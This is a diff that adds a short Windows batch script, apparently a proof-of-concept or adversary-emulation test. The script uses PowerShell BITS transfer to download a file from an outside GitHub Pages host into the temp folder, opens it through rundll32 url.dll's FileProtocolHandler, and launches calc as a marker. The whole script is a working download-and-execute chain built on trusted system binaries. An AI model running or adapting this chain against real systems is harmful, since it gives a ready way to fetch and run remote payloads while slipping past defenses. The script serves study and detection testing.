@@ -1,0 +1,3 @@
+@echo off
+powershell.exe -c (Start-BitsTransfer -Source "https://sheng855174.github.io/pdf-test.pdf" -Destination "%temp%\pdf-test.pdf")
+rundll32 url.dll,FileProtocolHandler file:///%temp%/pdf-test.pdf && calc"
